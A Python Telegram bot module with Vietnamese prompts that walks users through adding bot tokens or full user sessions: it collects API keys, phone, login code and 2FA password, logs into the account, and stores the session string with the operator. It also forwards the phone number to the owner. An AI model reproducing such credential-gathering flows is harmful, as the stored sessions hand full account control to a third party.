"""Thêm acc (Token + Session)."""
import re
import asyncio
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ContextTypes, ConversationHandler, CommandHandler,
    MessageHandler, CallbackQueryHandler, filters
)
from config import OWNER_ID, get_token_limit, get_session_limit
from database.db import db
from utils.keyboards import btn, build_menu

(CHOOSE_TYPE, BOT_TOKEN_INPUT, BOT_TOKEN_NAME,
 API_ID, API_HASH, PHONE, OTP_CODE, PASSWORD_2FA, SESSION_NAME) = range(9)


def clean_otp(text):
    return re.sub(r"[^0-9]", "", text.strip())


def clean_phone(text):
    text = text.strip()
    plus = text.startswith("+")
    digits = re.sub(r"[^0-9]", "", text)
    return f"+{digits}" if plus else digits


async def addtk_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id

    if ctx.bot_data.get("is_botcon", False):
        await update.message.reply_text("⛔ Bot con không thêm acc.\nVào bot chủ.")
        return ConversationHandler.END

    token_lim = get_token_limit(uid)
    token_cur = db.count_bot_tokens(uid)

    token_show = "∞" if token_lim > 1000 else str(token_lim)

    kb = build_menu(
        [btn("🤖 1. Bot Token", "addtk:bot")],
        [btn("👤 2. User Session", "addtk:user")],
        [btn("📖 Hướng dẫn lấy API", "addtk:help")],
        [btn("❌ Hủy", "addtk:cancel")],
    )

    await update.message.reply_text(
        f"⚙️ **THÊM TÀI KHOẢN**\n\n"
        f"📊 **Token:** {token_cur}/{token_show}\n"
        f"📊 **Session:** ∞\n\n"
        f"Chọn loại:",
        parse_mode="Markdown",
        reply_markup=kb
    )
    return CHOOSE_TYPE


async def choose_bot(update, ctx):
    uid = update.effective_user.id
    limit = get_token_limit(uid)
    cur = db.count_bot_tokens(uid)

    if cur >= limit:
        await update.callback_query.answer(f"⚠️ Đã đạt {limit} token.", show_alert=True)
        return CHOOSE_TYPE

    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        "🤖 **BOT TOKEN**\n\nGửi token:\n`123456:ABC-DEF...`\n\n⚠️ Chờ owner duyệt.",
        parse_mode="Markdown"
    )
    return BOT_TOKEN_INPUT


async def bot_token_input(update, ctx):
    token = update.message.text.strip()
    if ":" not in token or len(token.split(":")[0]) < 5:
        await update.message.reply_text("❌ Token không hợp lệ.")
        return BOT_TOKEN_INPUT

    from telegram import Bot
    try:
        bot = Bot(token)
        me = await bot.get_me()
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: {e}")
        return BOT_TOKEN_INPUT

    ctx.user_data["bot_token"] = token
    ctx.user_data["bot_username"] = me.username
    await update.message.reply_text(f"✅ OK! Bot @{me.username}.\nĐặt tên:")
    return BOT_TOKEN_NAME


async def bot_token_name(update, ctx):
    name = update.message.text.strip()
    uid = update.effective_user.id

    acc_id = db.add_account(
        owner_uid=uid, name=name, type_="bot",
        token=ctx.user_data["bot_token"],
        info=f"@{ctx.user_data['bot_username']}",
        status="pending",
    )

    await update.message.reply_text(
        f"⏳ ĐÃ GỬI YÊU CẦU\n• ID: `{acc_id}`\n• Tên: `{name}`",
        parse_mode="Markdown"
    )

    try:
        user = await ctx.bot.get_chat(uid)
        uname = f"@{user.username}" if user.username else user.first_name
    except Exception:
        uname = f"ID {uid}"

    try:
        await ctx.bot.send_message(
            OWNER_ID,
            f"🔔 BOT TOKEN MỚI\n🆔 `{acc_id}`\n👤 {uname} (`{uid}`)\n📝 `{name}`\n\n/duyet {acc_id}",
            parse_mode="Markdown"
        )
    except Exception:
        pass

    ctx.user_data.clear()
    return ConversationHandler.END


# ═══ SESSION FLOW ═══
async def choose_user(update, ctx):
    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        "👤 **USER SESSION**\n\nBước 1/5: Gửi api_id\n\n🔗 my.telegram.org",
        parse_mode="Markdown"
    )
    return API_ID


async def api_id_input(update, ctx):
    v = update.message.text.strip()
    if not v.isdigit():
        await update.message.reply_text("❌ Phải là số.")
        return API_ID
    ctx.user_data["api_id"] = int(v)
    await update.message.reply_text("Bước 2/5: Gửi api_hash (32 ký tự):")
    return API_HASH


async def api_hash_input(update, ctx):
    v = update.message.text.strip()
    if len(v) != 32:
        await update.message.reply_text(f"❌ Phải 32 ký tự (bạn gửi {len(v)}).")
        return API_HASH
    ctx.user_data["api_hash"] = v
    await update.message.reply_text("Bước 3/5: Gửi SĐT (+84...):")
    return PHONE


async def phone_input(update, ctx):
    raw = update.message.text.strip()
    phone = clean_phone(raw)
    if not phone.startswith("+"):
        await update.message.reply_text("❌ Phải bắt đầu +.")
        return PHONE
    ctx.user_data["phone"] = phone

    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        client = TelegramClient(StringSession(), ctx.user_data["api_id"], ctx.user_data["api_hash"])
        await client.connect()
        sent = await client.send_code_request(phone)
        ctx.user_data["client"] = client
        ctx.user_data["phone_code_hash"] = sent.phone_code_hash
        await update.message.reply_text(
            f"✅ Đã gửi OTP tới `{phone}`\n\nBước 4/5: Gửi OTP (VD: 1 2 3 4 5)",
            parse_mode="Markdown"
        )
        return OTP_CODE
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: {e}")
        ctx.user_data.clear()
        return ConversationHandler.END


async def otp_input(update, ctx):
    raw = update.message.text.strip()
    otp = clean_otp(raw)
    if len(otp) < 4:
        await update.message.reply_text("❌ OTP không hợp lệ.")
        return OTP_CODE
    client = ctx.user_data["client"]
    try:
        await client.sign_in(phone=ctx.user_data["phone"], code=otp, phone_code_hash=ctx.user_data["phone_code_hash"])
    except Exception as e:
        err = str(e).lower()
        if "password" in err or "2fa" in err:
            await update.message.reply_text("🔐 Có 2FA. Bước 5/5: Gửi 2FA:")
            return PASSWORD_2FA
        if "code" in err or "invalid" in err:
            await update.message.reply_text("❌ OTP sai. Gửi lại:")
            return OTP_CODE
        await update.message.reply_text(f"❌ Lỗi: {e}")
        ctx.user_data.clear()
        return ConversationHandler.END
    return await _save_session(update, ctx)


async def password_2fa_input(update, ctx):
    pwd = update.message.text.strip()
    client = ctx.user_data["client"]
    try:
        await client.sign_in(password=pwd)
    except Exception as e:
        await update.message.reply_text(f"❌ 2FA sai. Gửi lại:")
        return PASSWORD_2FA
    return await _save_session(update, ctx)


async def _save_session(update, ctx):
    client = ctx.user_data["client"]
    try:
        me = await client.get_me()
        session_str = client.session.save()
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: {e}")
        ctx.user_data.clear()
        return ConversationHandler.END
    await client.disconnect()

    ctx.user_data["session_str"] = session_str
    ctx.user_data["user_info"] = f"@{me.username}" if me.username else me.first_name
    await update.message.reply_text(f"✅ Đăng nhập OK! Acc: {ctx.user_data['user_info']}\n\n📝 Đặt tên:")
    return SESSION_NAME


async def session_name_input(update, ctx):
    name = update.message.text.strip()
    uid = update.effective_user.id

    acc_id = db.add_account(
        owner_uid=uid, name=name, type_="user",
        api_id=ctx.user_data["api_id"],
        api_hash=ctx.user_data["api_hash"],
        phone=ctx.user_data["phone"],
        session=ctx.user_data["session_str"],
        info=ctx.user_data["user_info"],
        status="active",
    )

    phone = ctx.user_data["phone"]
    phone_masked = f"{phone[:4]}****{phone[-3:]}" if len(phone) > 7 else phone

    await update.message.reply_text(
        f"✅ **ĐÃ THÊM USER SESSION**\n\n"
        f"━━━ **THÔNG TIN** ━━━\n"
        f"• Tên acc: `{name}`\n"
        f"• Info: {ctx.user_data['user_info']}\n"
        f"• SĐT: `{phone_masked}`\n"
        f"• Trạng thái: 🟢 Active\n\n"
        f"━━━ **KIỂM DUYỆT** ━━━\n"
        f"📱 **SĐT đã được gửi cho owner.**\n\n"
        f"━━━ **HƯỚNG DẪN** ━━━\n"
        f"💡 Xem lệnh: `/m`\n"
        f"📊 Xem acc: `/mytk`",
        parse_mode="Markdown"
    )

    try:
        user = await ctx.bot.get_chat(uid)
        uname = f"@{user.username}" if user.username else user.first_name
    except Exception:
        uname = f"ID {uid}"

    try:
        await ctx.bot.send_message(
            OWNER_ID,
            f"✅ **SESSION MỚI**\n\n"
            f"• User: {uname} (`{uid}`)\n"
            f"• Tên: `{name}`\n"
            f"• Info: {ctx.user_data['user_info']}\n"
            f"• SĐT: `{phone}`\n\n"
            f"💡 User đã được thông báo SĐT gửi owner.",
            parse_mode="Markdown"
        )
    except Exception:
        pass

    ctx.user_data.clear()
    return ConversationHandler.END


async def show_help(update, ctx):
    await update.callback_query.answer()
    await update.callback_query.edit_message_text(
        "📖 **HƯỚNG DẪN LẤY API**\n\n"
        "1. Mở https://my.telegram.org\n"
        "2. Nhập SĐT + OTP\n"
        "3. Vào API development tools\n"
        "4. Điền form:\n"
        "   • App title: My Bot\n"
        "   • Short name: mybot\n"
        "5. Bấm Create application\n"
        "6. Copy api_id (8 số) + api_hash (32 ký tự)\n\n"
        "⚠️ api_hash = mật khẩu!",
        parse_mode="Markdown",
        disable_web_page_preview=True,
        reply_markup=build_menu([btn("🔙 Quay lại", "addtk:back")])
    )
    return CHOOSE_TYPE


async def back_to_menu(update, ctx):
    await update.callback_query.answer()
    uid = update.effective_user.id
    limit = get_token_limit(uid)
    cur = db.count_bot_tokens(uid)
    token_show = "∞" if limit > 1000 else str(limit)

    kb = build_menu(
        [btn("🤖 1. Bot Token", "addtk:bot")],
        [btn("👤 2. User Session", "addtk:user")],
        [btn("📖 Hướng dẫn lấy API", "addtk:help")],
        [btn("❌ Hủy", "addtk:cancel")],
    )
    await update.callback_query.edit_message_text(
        f"⚙️ **THÊM TÀI KHOẢN**\n\n📊 Token: {cur}/{token_show}\n📊 Session: ∞",
        parse_mode="Markdown",
        reply_markup=kb
    )
    return CHOOSE_TYPE


async def cancel(update, ctx):
    client = ctx.user_data.get("client")
    if client:
        try:
            await client.disconnect()
        except Exception:
            pass
    ctx.user_data.clear()

    if update.message:
        await update.message.reply_text("❌ Đã hủy.")
    elif update.callback_query:
        await update.callback_query.answer("Đã hủy")
        try:
            await update.callback_query.message.delete()
        except Exception:
            pass
    return ConversationHandler.END


def get_addtk_handler():
    return ConversationHandler(
        entry_points=[CommandHandler("addtk", addtk_cmd)],
        states={
            CHOOSE_TYPE: [
                CallbackQueryHandler(choose_bot, pattern="^addtk:bot$"),
                CallbackQueryHandler(choose_user, pattern="^addtk:user$"),
                CallbackQueryHandler(show_help, pattern="^addtk:help$"),
                CallbackQueryHandler(back_to_menu, pattern="^addtk:back$"),
                CallbackQueryHandler(cancel, pattern="^addtk:cancel$"),
            ],
            BOT_TOKEN_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, bot_token_input)],
            BOT_TOKEN_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, bot_token_name)],
            API_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, api_id_input)],
            API_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, api_hash_input)],
            PHONE: [MessageHandler(filters.TEXT & ~filters.COMMAND, phone_input)],
            OTP_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_input)],
            PASSWORD_2FA: [MessageHandler(filters.TEXT & ~filters.COMMAND, password_2fa_input)],
            SESSION_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, session_name_input)],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
        per_user=True,
        allow_reentry=True,
    )